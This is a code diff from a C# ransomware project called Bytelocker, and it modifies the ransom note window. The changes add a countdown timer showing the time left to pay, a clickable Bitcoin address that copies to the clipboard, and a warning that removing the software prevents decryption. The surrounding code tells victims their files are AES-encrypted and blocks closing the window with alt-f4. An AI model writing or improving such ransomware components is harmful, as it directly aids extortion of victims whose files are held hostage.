@@ -1,4 +1,5 @@
-﻿using System;
+﻿using Bytelocker.src;
+using System;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
@@ -12,6 +13,8 @@ namespace Bytelocker.UI
 {
     public partial class MainWindow : Form
     {
+        CommandManager cm = new CommandManager();
+
         public MainWindow()
         {
             InitializeComponent();
@@ -19,18 +22,11 @@ namespace Bytelocker.UI
 
         private void MainWindow_Load(object sender, EventArgs e)
         {
-            /*
-             * Your important files, documents, pictures, etc. have been encrypted. Here is a complete list of encrypted files, you can verify this manually.
+            // time label
+            this.lbTimeLeft.Text = (TimeSpan.FromSeconds(TimeManager.DetermineRemainingTimeInSeconds())).ToString(@"dd\:hh\:mm\:ss");
+            // end time label
 
-Encryption was produced using AES 256, in order to decrypt the files you need to obtain the password used to generate the key.
-
-To obtain the password, you will need to pay 20$ USD or a similar amount in a different currency.
-
-Click <<Next>> to select method of payment.
-
-NOTE: Removal of this software will lead to inability to decrypt files.
-
-             */
+            // rtf box
             this.rtfInfo.AppendText("Your important files, documents, pictures, etc. Have been encrypted" + "\n\n");
 
             LinkLabel llListOfInfectedFiles = new LinkLabel();
@@ -72,8 +68,22 @@ NOTE: Removal of this software will lead to inability to decrypt files.
             this.rtfInfo.SelectionStart = this.rtfInfo.TextLength;
 
 
-            this.rtfInfo.AppendText("amount converted to Bitcoin to the following address:" + "\n" +
-                Bytelocker.BITCOIN_ADDRESS + "\n\n");
+            this.rtfInfo.AppendText("in Bitcoin to the following address: (click to copy)" + "\n\n" + new String(' ', 10));
+
+
+            LinkLabel llBitcoinAddress = new LinkLabel();
+            llBitcoinAddress.Text = Bytelocker.BITCOIN_ADDRESS;
+            llBitcoinAddress.LinkClicked += new LinkLabelLinkClickedEventHandler(this.On_llBitcoinAddress_Click);
+            llBitcoinAddress.AutoSize = true;
+            llBitcoinAddress.Location = this.rtfInfo.GetPositionFromCharIndex(this.rtfInfo.TextLength);
+            this.rtfInfo.Controls.Add(llBitcoinAddress);
+            this.rtfInfo.AppendText(llBitcoinAddress.Text);
+            this.rtfInfo.AppendText(new String(' ', 3));
+            this.rtfInfo.SelectionStart = this.rtfInfo.TextLength;
+
+
+            this.rtfInfo.AppendText("\n\n\n");
+
 
             LinkLabel llBitcoinInfo = new LinkLabel();
             llBitcoinInfo.Text = "Getting started with Bitcoin";
@@ -84,6 +94,9 @@ NOTE: Removal of this software will lead to inability to decrypt files.
             this.rtfInfo.AppendText(llBitcoinInfo.Text);
             this.rtfInfo.AppendText("\n");
             this.rtfInfo.SelectionStart = this.rtfInfo.TextLength;
+
+            this.rtfInfo.AppendText("\n\n\n" + "NOTE: Removal of this software will lead to inability to decrypt files.");
+            // end rtf box
         }
 
         // override alt-f4
@@ -104,6 +117,11 @@ NOTE: Removal of this software will lead to inability to decrypt files.
         private void On_llUSDToBitcoin_Click(object sender, EventArgs e)
         {
             System.Diagnostics.Process.Start("https://www.google.com/search?q=" + Bytelocker.COST_TO_DECRYPT + "+usd+to+bitcoin");
+        }
+
+        private void On_llBitcoinAddress_Click(object sender, EventArgs e)
+        {
+            cm.CopyToClipboard(Bytelocker.BITCOIN_ADDRESS);
         }
 
         private void On_llListOfInfectedFiles_Click(object sender, EventArgs e)
